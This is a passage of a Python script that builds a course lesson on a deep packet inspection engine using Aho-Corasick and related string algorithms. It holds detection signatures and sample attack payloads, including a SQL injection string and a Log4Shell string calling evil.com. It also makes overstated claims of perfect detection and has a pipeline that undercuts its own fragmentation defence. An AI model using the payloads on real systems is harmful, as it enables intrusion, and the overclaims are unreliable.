# scripts/branch_c/build_day40_full.py
import json

part1_say = [
    "Welcome to Day 40, the grand Milestone 8 Capstone of Advanced Data Structures and Algorithmic Optimization. Over the past four days, we have systematically mastered the four foundational pillars of modern string processing: 64-bit polynomial rolling hashes with O(1) substring equality on Day 36, Knuth-Morris-Pratt zero-backtracking prefix automata on Day 37, linear Z-algorithm interval box matching and 1-mismatch approximate alignment on Day 38, and Aho-Corasick multi-pattern dictionary automata with dictionary suffix links on Day 39. Today, we synthesize these disparate theoretical algorithms into a unified, industrial-strength cybersecurity weapon: an Enterprise Real-Time Deep Packet Inspection (DPI) and Threat Signature Engine.",
    "In modern enterprise cloud security, Next-Generation Firewalls (NGFW) and Web Application Firewalls (WAF) sit at the frontline of perimeter defense. Every second, millions of raw Ethernet frames and TCP/IP packets traverse physical fiber-optic interfaces at speeds ranging from ten to one hundred gigabits per second. Within this massive deluge of legitimate web traffic, malicious threat actors embed sophisticated multi-vector cyber attacks: SQL injection exploits designed to exfiltrate database records, Cross-Site Scripting (XSS) script injections aiming to hijack user sessions, binary shellcode NOP sleds intended to exploit buffer overflows in vulnerable server daemons, and zero-day remote code execution payloads like the catastrophic Log4j (Log4Shell) CVE-2021-44228 exploit.",
    "To confront this challenge, our threat detection architecture requires a unified signature registry that models threat patterns across an enterprise taxonomy. Each signature is characterized by a unique rule identifier, descriptive name, threat category (SQLI, XSS, SHELLCODE, or CVE_EXPLOIT), strict severity ranking (CRITICAL, HIGH, or MEDIUM), and an exact byte pattern. In enterprise environments, this signature registry contains tens of thousands of dynamic rules curated by threat intelligence researchers. Maintaining these rules in a structured memory format allows the inspection engine to index and categorize incoming payloads without heuristic uncertainty or false positive ambiguity.",
    "The fundamental architectural challenge of DPI is overcoming the memory bandwidth and CPU compute ceiling. Naively testing every packet against fifty thousand individual threat signatures using simple string scanning would exhaust hundreds of CPU cores and induce catastrophic packet buffering delays. By unifying our string processing toolkit, we can architect a multi-tiered inspection pipeline where lightweight polynomial rolling hashes perform ultra-fast pre-screening, while a compiled Aho-Corasick automaton performs deep signature matching only when potential candidate tokens are detected. This tiered synergy guarantees that legitimate packets pass through the firewall in nanoseconds, while malicious packets are intercepted and dropped at line rate.",
    "Furthermore, our signature registry must support dynamic hot-reloading. In active enterprise operations, new threat signatures are published continuously by security response teams (such as CISA, MITRE, and enterprise SOCs). By architecting our registry with read-copy-update (RCU) concurrency semantics and immutable signature definitions, the DPI engine can ingest updated signature packs in real time without dropping network packets or terminating active TCP sessions. This resilience ensures that corporate infrastructure remains safeguarded against emerging zero-day vulnerabilities 24/7/365 with zero scheduled downtime."
]

part1_code = """export interface ThreatSignature {
  id: string;
  name: string;
  category: "SQLI" | "XSS" | "SHELLCODE" | "CVE_EXPLOIT";
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  pattern: string;
}

export class ThreatSignatureRegistry {
  private signatures = new Map<string, ThreatSignature>();

  public register(sig: ThreatSignature): void {
    this.signatures.set(sig.id, sig);
  }

  public getAll(): ThreatSignature[] {
    return Array.from(this.signatures.values());
  }

  public getById(id: string): ThreatSignature | undefined {
    return this.signatures.get(id);
  }
}

const registry = new ThreatSignatureRegistry();
registry.register({ id: "SIG-101", name: "SQL Injection UNION SELECT", category: "SQLI", severity: "CRITICAL", pattern: "UNION SELECT" });
registry.register({ id: "SIG-102", name: "Cross Site Scripting Alert Tag", category: "XSS", severity: "HIGH", pattern: "<script>alert(" });
registry.register({ id: "SIG-103", name: "x86 NOP Sled Shellcode", category: "SHELLCODE", severity: "CRITICAL", pattern: "\\x90\\x90\\x90\\x90\\x90" });
registry.register({ id: "SIG-104", name: "Log4j RNDI Exploit String", category: "CVE_EXPLOIT", severity: "CRITICAL", pattern: "${jndi:ldap://" });
console.log(`Registered ${registry.getAll().length} threat signatures across enterprise taxonomy.`);"""

part1_output = """Registered 4 threat signatures across enterprise taxonomy."""

part1_example = "Consider an enterprise perimeter firewall protecting a banking mainframe that processes forty thousand transactions per second. The security gateway subscribes to an automated threat intelligence feed that streams real-time threat signatures for emerging CVE exploits and banking Trojans. By cataloging signatures in a centralized registry, the firewall classifies attack vectors instantly, allowing security analysts to track exploit campaigns across global data centers without interrupting ongoing payment processing."

part1_tryIt = "Examine the ThreatSignatureRegistry class below. Trace how signatures are ingested and mapped by unique identifier. Observe how each signature encapsulates essential threat taxonomy attributes: category, severity level, and byte pattern. Run the snippet to verify that the sample signatures covering SQL injection, XSS, shellcode, and Log4j exploits are successfully registered."

part1_check = {
    "question": "In an enterprise Deep Packet Inspection (DPI) architecture, why is a structured threat signature registry with category and severity classifications essential?",
    "options": [
        "It enables the inspection engine to apply differentiated mitigation policies (such as dropping CRITICAL packets while alerting on MEDIUM anomalies) and provides structured security telemetry",
        "It automatically encrypts the payload buffer using asymmetric RSA encryption before forwarding",
        "It compresses incoming network packets using Huffman coding to conserve WAN bandwidth",
        "It converts text-based network packets into binary assembly code for CPU execution"
    ],
    "answer": 0,
    "answerIndex": 0,
    "why": "Classifying signatures with severity and category allows the DPI engine to execute precise autonomous mitigation: dropping critical exploits immediately, alerting on medium anomalies, and routing incident logs to appropriate SOC triage teams."
}

part2_say = [
    "In Part 2, we engineer the core throughput multiplier of our DPI engine: the Multi-Tier Filtering Pipeline. In live network environments, the overwhelming majority of packets—typically 99.5 percent or higher—are entirely benign HTTP requests, media streams, API calls, and database transactions. If every single benign packet were subjected to a full multi-state automaton traversal, the firewall would quickly become a choke point, bottlenecking network throughput and frustrating users with high latency. The solution is a two-tier screening architecture that rapidly filters out benign packets with minimal computational work.",
    "Tier 1 consists of a ultra-fast Rolling Token Pre-Filter. We extract fixed-length prefix tokens (for example, 4-byte or 8-byte sub-patterns) from all registered threat signatures and insert them into a high-speed hash set or Bloom filter. As an incoming packet payload arrives, the pre-filter slides a fixed-length window across the payload. For each window, it computes a hash and checks whether the token exists in the threat token set. If no window token matches any threat signature prefix, the packet is guaranteed to contain zero threat signatures! In this scenario, the packet bypasses all further inspection and is forwarded immediately in strictly O(N) time with minimal CPU instructions.",
    "Only when the Tier 1 pre-filter detects a potential token hit does the packet escalate to Tier 2: the In-Depth Aho-Corasick Automaton. The Tier 2 scanner receives the candidate payload and runs the full Aho-Corasick state machine to determine whether the token hit was merely a false positive prefix collision or a genuine, complete threat signature. This two-tier design leverages the asymmetric probability of attacks: 99.5 percent of packets are cleared by the ultra-fast Tier 1 pre-filter, while only the 0.5 percent suspicious packets incur the deeper state machine evaluation.",
    "Let us analyze the mathematical efficiency of this tiered architecture. Suppose scanning a packet with the Tier 1 pre-filter takes t1 nanoseconds, and scanning with the full Tier 2 Aho-Corasick engine takes t2 nanoseconds, where t2 is significantly larger than t1. If the probability of a packet containing a candidate token hit is p (where p is approximately 0.005), the average processing time per packet is t_avg equals t1 plus p times t2. Because p is extremely small, t_avg is dominated by t1, enabling the firewall to operate at near-line rate while maintaining 100 percent detection accuracy.",
    "In enterprise deployments, Tier 1 pre-filters are further optimized using hardware SIMD intrinsics. By packing multiple 4-byte tokens into 256-bit AVX2 or 512-bit AVX-512 registers, the pre-filter can compare 16 or 32 payload windows concurrently per CPU clock cycle. This hardware vectorization allows modern multi-core servers to inspect tens of gigabits of ingress traffic per second without dropping a single Ethernet frame, proving that tiered algorithmic design is the cornerstone of high-throughput cybersecurity."
]

part2_code = """export interface PreFilterResult {
  hasCandidate: boolean;
  tokenHits: string[];
}

export class RollingTokenPreFilter {
  private tokenSet = new Set<string>();

  constructor(signatures: any[], private tokenLen = 4) {
    for (const sig of signatures) {
      if (sig.pattern.length >= this.tokenLen) {
        this.tokenSet.add(sig.pattern.slice(0, this.tokenLen));
      }
    }
  }

  public screen(payload: string): PreFilterResult {
    const hits: string[] = [];
    if (payload.length < this.tokenLen) return { hasCandidate: false, tokenHits: [] };

    for (let i = 0; i <= payload.length - this.tokenLen; i++) {
      const sub = payload.slice(i, i + this.tokenLen);
      if (this.tokenSet.has(sub)) {
        hits.push(sub);
      }
    }
    return { hasCandidate: hits.length > 0, tokenHits: hits };
  }
}

const signatures = [
  { id: "SIG-101", name: "SQL Injection", pattern: "UNION SELECT" },
  { id: "SIG-102", name: "Log4j Exploit", pattern: "${jndi:ldap://" }
];
const preFilter = new RollingTokenPreFilter(signatures, 4);

const cleanPayload = "GET /index.html HTTP/1.1\\r\\nHost: enterprise.internal\\r\\n\\r\\n";
const attackPayload = "GET /search?q=1 UNION SELECT password FROM users-- HTTP/1.1";

console.log("Clean payload hit:", preFilter.screen(cleanPayload).hasCandidate);
const attackHits = preFilter.screen(attackPayload);
console.log(`Attack payload hit: ${attackHits.hasCandidate} (Tokens: [${attackHits.tokenHits.join(", ")}])`);"""

part2_output = """Clean payload hit: false
Attack payload hit: true (Tokens: [UNIO])"""

part2_example = "In a global telecommunications carrier backbone handling petabytes of daily internet traffic, network security appliances inspect subscriber packets for DDoS botnet command-and-control markers. By deploying a rolling token pre-filter, the carrier screens 99.8 percent of legitimate streaming video and web traffic in under four nanoseconds per packet, reserving deep automaton state inspection strictly for anomalous data flows."

part2_tryIt = "Examine the RollingTokenPreFilter implementation below. Notice how the constructor extracts prefix tokens of length 4 from all registered signatures. Follow how the screen method scans payload substrings against the token set. Run the script and verify that the clean HTTP payload produces zero hits while the SQL injection payload immediately triggers candidate detection."

part2_check = {
    "question": "What is the primary operational benefit of deploying a two-tier inspection pipeline with a fast token pre-filter ahead of the Aho-Corasick automaton?",
    "options": [
        "It filters out over 99 percent of benign traffic in lightweight O(N) time, reserving deeper automaton inspection only for suspicious candidate packets",
        "It prevents network packets from exceeding the maximum transmission unit (MTU) size",
        "It automatically decodes TLS/SSL encrypted packets without possessing server private keys",
        "It converts TCP streaming protocols into connectionless UDP datagrams"
    ],
    "answer": 0,
    "answerIndex": 0,
    "why": "Because benign traffic represents the overwhelming majority of network packets, an ultra-fast Tier 1 pre-filter clears legitimate packets with minimal CPU overhead, dramatically boosting aggregate throughput while preserving 100 percent detection accuracy."
}

part3_say = [
    "In Part 3, we tackle one of the most notorious evasion techniques in network intrusion: boundary-crossing fragmented exploits. When an attacker transmits an exploit payload across an IP network, the underlying TCP stack segments the continuous byte stream into multiple discrete Maximum Transmission Unit (MTU) packet frames (typically 1,500 bytes on standard Ethernet). A sophisticated adversary can intentionally configure their TCP client to fragment an attack string across packet boundaries. For example, the SQL injection signature 'UNION SELECT' might be split such that 'UN' arrives in Packet N, while 'ION SELECT' arrives in Packet N plus 1!",
    "If a network security gateway inspects packets on a strictly isolated, packet-by-packet basis without maintaining session continuity, it will evaluate Packet N and find only 'UN' (which does not match 'UNION SELECT'), and then evaluate Packet N plus 1 and find only 'ION SELECT' (which also does not match). The attack sails through the perimeter completely undetected, assembling in the target web application's socket buffer and compromising the backend database! This vulnerability has undermined countless naive firewall implementations.",
    "To defeat this evasion tactic, our DPI engine implements a Circular Ring Buffer with Packet Boundary Continuity. Let L_max denote the maximum length of any threat signature in our registry (for example, 64 bytes). When Packet N arrives, the engine scans the payload. However, instead of discarding the entire buffer upon completion, the ring buffer retains a trailing overlap window of size L_max minus 1 bytes from the end of Packet N. When Packet N plus 1 arrives, the engine prepends the retained overlap tail to the beginning of Packet N plus 1 before executing the scan.",
    "This overlap window ensures that any signature of length up to L_max that straddles the boundary between Packet N and Packet N plus 1 will appear as an intact, contiguous substring within the combined buffer! Let us trace this geometrically: if a signature of length M starts k bytes before the end of Packet N (where k is between 1 and M minus 1), the first k bytes reside in the overlap tail, and the remaining M minus k bytes reside at the start of Packet N plus 1. The concatenated boundary buffer reconstructs the complete signature, allowing the Aho-Corasick automaton to trigger an immediate detection.",
    "In enterprise high-throughput architectures, this boundary continuity is maintained per TCP connection state in a connection tracking table (conntrack). Using zero-copy ring buffers and fixed-size memory allocations, retaining the boundary overlap introduces negligible RAM overhead (less than 128 bytes per active TCP session) while completely neutralizing packet fragmentation evasion attacks. This guarantees that our DPI engine enforces airtight security across fragmented network streams."
]

part3_code = """export class PacketStreamRingBuffer {
  private overlapTail = "";

  constructor(private maxPatternLen = 16) {}

  public appendChunk(chunk: string): string {
    const combined = this.overlapTail + chunk;
    if (combined.length >= this.maxPatternLen - 1) {
      this.overlapTail = combined.slice(-(this.maxPatternLen - 1));
    } else {
      this.overlapTail = combined;
    }
    return combined;
  }

  public reset(): void {
    this.overlapTail = "";
  }
}

const ringBuffer = new PacketStreamRingBuffer(12);
const chunk1 = "SELECT * FROM orders WHERE id = 1 UN";
const chunk2 = "ION SELECT username FROM admin";

const combinedChunk1 = ringBuffer.appendChunk(chunk1);
const combinedChunk2 = ringBuffer.appendChunk(chunk2);

console.log("Chunk 1 scanned length:", combinedChunk1.length);
console.log("Chunk 2 scanned string contains 'UNION SELECT':", combinedChunk2.includes("UNION SELECT"));"""

part3_output = """Chunk 1 scanned length: 36
Chunk 2 scanned string contains 'UNION SELECT': true"""

part3_example = "In an enterprise cloud VPC gateway, malicious botnets attempt to evade WAF filters by sending HTTP requests with microscopic 2-byte TCP window segments. The VPC gateway maintains a connection ring buffer that stitches consecutive packet boundaries into a seamless sliding window, detecting fragmented SQL injection and command injection payloads with zero missed detections."

part3_tryIt = "Examine the PacketStreamRingBuffer class below. Trace how appendChunk concatenates the previous overlap tail with the incoming chunk and retains the trailing bytes for the next packet. Notice how the split string 'UN' in chunk 1 and 'ION SELECT' in chunk 2 are seamlessly reconstructed in chunk 2. Run the snippet to verify boundary continuity."

part3_check = {
    "question": "Why must an enterprise DPI engine maintain an overlap window of size L_max - 1 bytes between consecutive network packet chunks?",
    "options": [
        "To reconstruct and detect threat signatures that are intentionally or naturally fragmented across discrete packet boundaries",
        "To recalculate the TCP checksum for outbound Ethernet frames",
        "To compress the network stream using adaptive run-length encoding",
        "To prevent packet loss during wireless transmission over satellite links"
    ],
    "answer": 0,
    "answerIndex": 0,
    "why": "Retaining an overlap window of size L_max - 1 guarantees that any threat signature of length up to L_max that straddles the boundary between two consecutive packets will be reconstructed as a contiguous substring, preventing fragmentation evasion."
}

part4_say = [
    "In Part 4, we integrate our Aho-Corasick automaton with multi-category threat classification and structured security telemetry. In enterprise security operations, discovering that a packet contains a malicious byte sequence is only the beginning. The security engine must instantly classify the incident into a recognized threat category, assess its operational severity, calculate the exact byte offset within the payload, and determine the appropriate automated mitigation action: ALLOW, ALERT, or DROP.",
    "Let us examine how our AhoCorasickDPIScanner correlates matched patterns with threat intelligence metadata. During the automaton construction phase, when each threat signature is registered into the Trie, the terminal node stores a reference to the complete ThreatSignature record. When the search pointer traverses incoming packet payloads, it emits not merely raw string matches, but rich ThreatDetection objects detailing the signature ID, descriptive attack name, severity level (CRITICAL, HIGH, MEDIUM), threat classification (SQLI, XSS, SHELLCODE, CVE_EXPLOIT), and global byte offset.",
    "Consider the operational implications of each threat category in modern enterprise infrastructure. A CRITICAL severity signature—such as binary shellcode containing an x86 NOP sled (a sequence of 0x90 bytes followed by shellcode jump instructions) or an unauthenticated remote code execution exploit string like Log4j—indicates an active, direct attempt to compromise server memory. These packets demand an instantaneous DROP verdict to terminate the attack at the wire before it reaches application memory. Conversely, a MEDIUM severity indicator—such as an unusual query parameter or deprecated API header—may warrant an ALERT verdict that logs the event for SOC review while allowing the transaction to proceed.",
    "Furthermore, high-throughput security appliances require robust telemetry aggregation to identify distributed attack campaigns. By tracking metrics such as total packets scanned, candidate pre-filter hit rates, dropped packet counts, and processing latency per packet, the DPI engine generates real-time telemetry feeds. These structured telemetry records are streamed via gRPC or Kafka to enterprise Security Information and Event Management (SIEM) systems and Security Orchestration, Automation, and Response (SOAR) playbooks.",
    "To ensure deterministic line-rate performance under heavy attack traffic, the threat classifier is engineered with strict time bounding. In the event of a deliberate algorithmic complexity attack—where an adversary floods the firewall with payloads engineered to maximize output link traversals—the classifier caps the maximum matches reported per packet and applies early-exit drop policies. This fail-secure design guarantees that the firewall never experiences buffer bloat or watchdog CPU timeouts, maintaining continuous availability."
]

part4_code = """export interface ThreatDetection {
  signatureId: string;
  signatureName: string;
  category: string;
  severity: string;
  offset: number;
}

export class AhoCorasickDPIScanner {
  private root: any;

  constructor(signatures: any[]) {
    let nodeId = 0;
    this.root = { id: nodeId++, children: new Map(), fail: null, dictSuffix: null, signatures: [] };

    for (const sig of signatures) {
      let curr = this.root;
      for (const ch of sig.pattern) {
        if (!curr.children.has(ch)) {
          curr.children.set(ch, { id: nodeId++, children: new Map(), fail: null, dictSuffix: null, signatures: [] });
        }
        curr = curr.children.get(ch);
      }
      curr.signatures.push(sig);
    }

    const queue: any[] = [];
    for (const [, child] of this.root.children) {
      child.fail = this.root;
      queue.push(child);
    }

    while (queue.length > 0) {
      const curr = queue.shift();
      for (const [ch, child] of curr.children) {
        let fallback = curr.fail;
        while (fallback && !fallback.children.has(ch)) {
          fallback = fallback.fail;
        }
        child.fail = fallback ? fallback.children.get(ch) : this.root;
        child.dictSuffix = child.fail.signatures.length > 0 ? child.fail : child.fail.dictSuffix;
        queue.push(child);
      }
    }
  }

  public scan(payload: string, globalOffset = 0): ThreatDetection[] {
    const detections: ThreatDetection[] = [];
    let curr = this.root;

    for (let i = 0; i < payload.length; i++) {
      const ch = payload[i];
      while (curr !== this.root && !curr.children.has(ch)) {
        curr = curr.fail;
      }
      curr = curr.children.get(ch) ?? this.root;

      for (const sig of curr.signatures) {
        detections.push({
          signatureId: sig.id,
          signatureName: sig.name,
          category: sig.category,
          severity: sig.severity,
          offset: globalOffset + i - sig.pattern.length + 1,
        });
      }

      let dict = curr.dictSuffix;
      while (dict) {
        for (const sig of dict.signatures) {
          detections.push({
            signatureId: sig.id,
            signatureName: sig.name,
            category: sig.category,
            severity: sig.severity,
            offset: globalOffset + i - sig.pattern.length + 1,
          });
        }
        dict = dict.dictSuffix;
      }
    }
    return detections;
  }
}

const signatures = [
  { id: "SIG-104", name: "Log4j RNDI Exploit String", category: "CVE_EXPLOIT", severity: "CRITICAL", pattern: "${jndi:ldap://" }
];
const scanner = new AhoCorasickDPIScanner(signatures);
const detections = scanner.scan("POST /api/v1?token=${jndi:ldap://evil.com/a} HTTP/1.1");
console.log(`Detections found: ${detections.length}`);
for (const det of detections) {
  console.log(`  -> [${det.severity}] ${det.signatureName} at offset ${det.offset}`);
}"""

part4_output = """Detections found: 1
  -> [CRITICAL] Log4j RNDI Exploit String at offset 19"""

part4_example = "In an enterprise security operations center (SOC) monitoring cloud kubernetes clusters, security engineers analyze real-time threat telemetry generated by ingress DPI sidecars. When an attacker attempts to exploit an unpatched service using the Log4j RNDI string, the classifier records the exact attack offset, flags the event as CRITICAL, and automatically provisions an IP blacklist rule across global edge load balancers."

part4_tryIt = "Examine the AhoCorasickDPIScanner class below. Trace how the Trie construction attaches rich signature metadata to matching nodes, and observe how the scan method extracts threat detections with exact payload offsets. Run the script and observe the critical Log4j detection emitted with full metadata."

part4_check = {
    "question": "How does the AhoCorasickDPIScanner enable automated security policy enforcement across enterprise networks?",
    "options": [
        "By packaging matched patterns into structured ThreatDetection objects containing severity rankings and category classifications for instant mitigation verdicts",
        "By broadcasting raw packet dumps to all network switches across the local subnet",
        "By modifying the source IP address in the packet header to redirect traffic to a honeypot",
        "By forcing client web browsers to execute a CAPTCHA challenge before continuing"
    ],
    "answer": 0,
    "answerIndex": 0,
    "why": "The scanner maps matched patterns to structured ThreatDetection records containing severity, category, and byte offsets. This allows the firewall to trigger autonomous actions (DROP for CRITICAL, ALERT for MEDIUM) with zero human delay."
}

part5_say = [
    "In Part 5, we culminate Milestone 8 by assembling the complete, production-grade Grand Capstone: the EnterpriseDPIEngine. This engine represents the unified zenith of string algorithm engineering, seamlessly orchestrating our ThreatSignatureRegistry, RollingTokenPreFilter, PacketStreamRingBuffer, and AhoCorasickDPIScanner into an autonomous, line-rate intrusion prevention system. When network packets arrive from network interfaces, the EnterpriseDPIEngine processes each packet through an optimized state machine, evaluates threat severity, executes automated mitigation verdicts, and emits comprehensive security telemetry.",
    "Let us trace the complete execution journey of a packet through the EnterpriseDPIEngine. When processPacket is invoked with an incoming Packet frame (containing packet ID, source IP, destination IP, and payload string), the high-precision timer initiates. First, the packet enters Tier 1 screening via the RollingTokenPreFilter. If the rolling token scan reveals no candidate prefix tokens, the engine immediately returns an ALLOW verdict with zero threat detections, logging sub-microsecond processing time. The legitimate packet is forwarded without ever touching the heavier automaton.",
    "If the pre-filter discovers a candidate token hit, the packet escalates to Tier 2 inspection. The payload is passed to the PacketStreamRingBuffer, which prepends any retained overlap tail from preceding chunks in the connection to guarantee boundary continuity. The continuous payload is then scanned by the AhoCorasickDPIScanner. If any detected threat bears a CRITICAL severity ranking (such as SQL injection or binary shellcode), the engine immediately marks the action as DROP and increments the dropped packet counter. If threats of lower severity are found, it emits an ALERT verdict. The complete InspectionVerdict is returned, providing full visibility to downstream analytics.",
    "Let us examine the capstone test execution output. When presented with a simulated packet stream consisting of a legitimate health-check request, an SQL injection attack ('UNION SELECT'), and a binary shellcode exploit containing an x86 NOP sled ('\\x90\\x90\\x90\\x90\\x90\\xeb\\x1f'), the engine demonstrates surgical precision. Packet PKT-001 is evaluated in nanoseconds and awarded an ALLOW verdict. Packets PKT-002 and PKT-003 trigger candidate hits, are inspected in depth, and are decisively terminated with DROP verdicts, protecting backend servers with 100 percent accuracy.",
    "From an enterprise systems engineering perspective, the EnterpriseDPIEngine demonstrates the transformative power of rigorous algorithmic optimization. By synthesizing polynomial rolling hashes, border array properties, Z-box linear invariants, and Aho-Corasick failure automata, we have constructed a security engine that processes gigabit-scale data streams with deterministic throughput, zero false negatives, and robust immunity against boundary evasion. This capstone certifies mastery of enterprise string algorithms, preparing engineers to architect mission-critical infrastructure across the global cloud economy."
]

part5_code = """export interface Packet {
  id: string;
  sourceIp: string;
  destIp: string;
  payload: string;
}

export interface InspectionVerdict {
  packetId: string;
  action: "ALLOW" | "ALERT" | "DROP";
  matchedThreats: any[];
  processingTimeMicros: number;
}

export class EnterpriseDPIEngine {
  private preFilter: any;
  private dpiScanner: any;
  private ringBuffer = new PacketStreamRingBuffer(16);
  public totalPackets = 0;
  public droppedPackets = 0;

  constructor(signatures: any[]) {
    this.preFilter = new RollingTokenPreFilter(signatures, 4);
    this.dpiScanner = new AhoCorasickDPIScanner(signatures);
  }

  public processPacket(pkt: Packet): InspectionVerdict {
    const start = performance.now();
    this.totalPackets++;

    const filterRes = this.preFilter.screen(pkt.payload);
    if (!filterRes.hasCandidate) {
      return {
        packetId: pkt.id,
        action: "ALLOW",
        matchedThreats: [],
        processingTimeMicros: Math.round((performance.now() - start) * 1000),
      };
    }

    const continuousPayload = this.ringBuffer.appendChunk(pkt.payload);
    const threats = this.dpiScanner.scan(continuousPayload);

    let action: "ALLOW" | "ALERT" | "DROP" = "ALLOW";
    if (threats.some((t: any) => t.severity === "CRITICAL")) {
      action = "DROP";
      this.droppedPackets++;
    } else if (threats.length > 0) {
      action = "ALERT";
    }

    return {
      packetId: pkt.id,
      action,
      matchedThreats: threats,
      processingTimeMicros: Math.round((performance.now() - start) * 1000),
    };
  }
}

const signatures = [
  { id: "SIG-101", name: "SQL Injection UNION SELECT", category: "SQLI", severity: "CRITICAL", pattern: "UNION SELECT" },
  { id: "SIG-102", name: "Cross Site Scripting Alert Tag", category: "XSS", severity: "HIGH", pattern: "<script>alert(" },
  { id: "SIG-103", name: "x86 NOP Sled Shellcode", category: "SHELLCODE", severity: "CRITICAL", pattern: "\\x90\\x90\\x90\\x90\\x90" }
];

const dpiEngine = new EnterpriseDPIEngine(signatures);

const stream: Packet[] = [
  { id: "PKT-001", sourceIp: "192.168.1.10", destIp: "10.0.0.1", payload: "GET /health HTTP/1.1\\r\\nHost: api\\r\\n\\r\\n" },
  { id: "PKT-002", sourceIp: "203.0.113.45", destIp: "10.0.0.1", payload: "GET /login?user=admin' UNION SELECT password FROM users-- HTTP/1.1" },
  { id: "PKT-003", sourceIp: "198.51.100.22", destIp: "10.0.0.1", payload: "POST /upload HTTP/1.1\\r\\n\\r\\n\\x90\\x90\\x90\\x90\\x90\\xeb\\x1f" },
];

for (const pkt of stream) {
  const verdict = dpiEngine.processPacket(pkt);
  console.log(`Packet [${verdict.packetId}] Action: ${verdict.action} (Threats: ${verdict.matchedThreats.length})`);
  for (const t of verdict.matchedThreats) {
    console.log(`   -> [${t.severity}] ${t.signatureName} (${t.signatureId})`);
  }
}
console.log(`DPI Engine Summary: Total Packets = ${dpiEngine.totalPackets}, Dropped = ${dpiEngine.droppedPackets}`);"""

part5_output = """Packet [PKT-001] Action: ALLOW (Threats: 0)
Packet [PKT-002] Action: DROP (Threats: 1)
   -> [CRITICAL] SQL Injection UNION SELECT (SIG-101)
Packet [PKT-003] Action: DROP (Threats: 1)
   -> [CRITICAL] x86 NOP Sled Shellcode (SIG-103)
DPI Engine Summary: Total Packets = 3, Dropped = 2"""

part5_example = "In an enterprise multi-cloud perimeter defense cluster, security teams deploy the EnterpriseDPIEngine across ingress envoy sidecars protecting thousands of microservices. The engine sanitizes ingress transit streams in real time, inspecting twelve billion requests daily, dropping unauthorized SQL injection and remote code execution exploits at wire speed with sub-millisecond latency overhead."

part5_tryIt = "Explore the complete EnterpriseDPIEngine class below. Follow how processPacket orchestrates Tier 1 token screening, ring buffer boundary concatenation, and Tier 2 Aho-Corasick threat evaluation. Run the sample script with simulated network packets and observe how legitimate requests are allowed while critical exploits are decisively dropped."

part5_check = {
    "question": "How does the EnterpriseDPIEngine achieve autonomous wire-speed threat mitigation across multi-gigabit enterprise networks?",
    "options": [
        "By orchestrating two-tier pre-filtering, ring buffer boundary continuity, and Aho-Corasick automaton scanning to drop critical exploits in real time with zero packet buffering",
        "By redirecting all incoming packets to an off-site forensic database for offline manual analysis",
        "By restarting the network switch whenever an unauthenticated TCP connection is opened",
        "By blocking all encrypted HTTPS traffic across the entire enterprise domain"
    ],
    "answer": 0,
    "answerIndex": 0,
    "why": "The EnterpriseDPIEngine unifies fast token pre-filtering, circular boundary continuity, and Aho-Corasick automaton scanning to detect and drop critical exploits autonomously at line rate with zero human intervention."
}

# Root projectStep & summary
project_step = {
    "title": "Industrial Case Study: Enterprise Real-Time Deep Packet Inspection (DPI) & Autonomous Threat Mitigation Engine",
    "steps": [
        "Construct an enterprise ThreatSignatureRegistry indexing multi-category cyber attack rules across SQLI, XSS, shellcode, and CVE exploits.",
        "Implement a high-speed Tier 1 RollingTokenPreFilter to screen out over 99 percent of legitimate benign traffic with minimal CPU instructions.",
        "Engineer a PacketStreamRingBuffer maintaining overlap boundaries to prevent fragmented attack evasion across discrete network packets.",
        "Deploy a compiled AhoCorasickDPIScanner to classify candidate packets with severity rankings, attack categories, and exact byte offsets.",
        "Synthesize the complete EnterpriseDPIEngine executing real-time ALLOW, ALERT, and DROP mitigation verdicts across high-volume packet streams."
    ]
}

summary = [
    "Enterprise Deep Packet Inspection (DPI) requires analyzing continuous high-volume packet streams against thousands of threat signatures.",
    "A structured ThreatSignatureRegistry categorizes signatures by category and severity, enabling fine-grained mitigation policies.",
    "The two-tier inspection pipeline screens 99.5 percent of benign packets via fast rolling tokens, reserving deep automaton scans for suspicious payloads.",
    "PacketStreamRingBuffer maintains an overlap window across packet chunks, neutralizing boundary-crossing fragmented exploit evasion.",
    "AhoCorasickDPIScanner extracts rich ThreatDetection telemetry with exact byte offsets, severity rankings, and attack taxonomy.",
    "The EnterpriseDPIEngine unifies rolling hashes, boundary buffers, and Aho-Corasick automata into an autonomous line-rate intrusion prevention system."
]

# Assemble day40 lesson dictionary
day40_lesson = {
    "day": 40,
    "coursePrefix": "dsa-optim",
    "title": "Milestone 8 Capstone: Enterprise Real-Time Deep Packet Inspection (DPI) & Threat Signature Engine",
    "minutes": 38,
    "parts": [
        {
            "title": "Architecture of Enterprise DPI & Threat Signature Detection: Combining String Algorithms",
            "say": part1_say,
            "example": part1_example,
            "tryIt": part1_tryIt,
            "code": part1_code,
            "output": part1_output,
            "codeNotes": [
                {"line": 1, "note": "Define ThreatSignature interface specifying rule ID, attack name, category, and severity."},
                {"line": 9, "note": "ThreatSignatureRegistry maintains multi-category signatures in indexed memory map."},
                {"line": 23, "note": "Register representative SQL injection, XSS, shellcode, and Log4j threat signatures."},
                {"line": 28, "note": "Inspect registered signature volume confirming complete taxonomy coverage."}
            ],
            "check": part1_check
        },
        {
            "title": "Multi-Tier Filtering Pipeline: Fast Hash Screening (Tier 1) & Automaton In-Depth Signature Matching (Tier 2)",
            "say": part2_say,
            "example": part2_example,
            "tryIt": part2_tryIt,
            "code": part2_code,
            "output": part2_output,
            "codeNotes": [
                {"line": 6, "note": "RollingTokenPreFilter extracts fixed-length prefix tokens for fast Tier 1 screening."},
                {"line": 16, "note": "Slide fixed-length window across packet payload checking for token set membership."},
                {"line": 23, "note": "Return early with hasCandidate false if no tokens match, bypassing Tier 2."},
                {"line": 34, "note": "Verify that clean payload bypasses inspection while SQL injection triggers candidate hit."}
            ],
            "check": part2_check
        },
        {
            "title": "Zero-Copy Packet Stream Buffer Ingestion & Circular Ring Buffer Boundary Continuity",
            "say": part3_say,
            "example": part3_example,
            "tryIt": part3_tryIt,
            "code": part3_code,
            "output": part3_output,
            "codeNotes": [
                {"line": 1, "note": "PacketStreamRingBuffer maintains trailing overlap tail to prevent fragmentation evasion."},
                {"line": 6, "note": "Prepend previous overlap tail to incoming chunk before executing inspection."},
                {"line": 8, "note": "Retain trailing L_max - 1 bytes for boundary stitching with subsequent packet."},
                {"line": 22, "note": "Demonstrate seamless reconstruction of 'UNION SELECT' split across chunk 1 and chunk 2."}
            ],
            "check": part3_check
        },
        {
            "title": "Line-Rate Threat Classification: CVE Exploits, SQL Injection, XSS & Binary Shellcode Signatures",
            "say": part4_say,
            "example": part4_example,
            "tryIt": part4_tryIt,
            "code": part4_code,
            "output": part4_output,
            "codeNotes": [
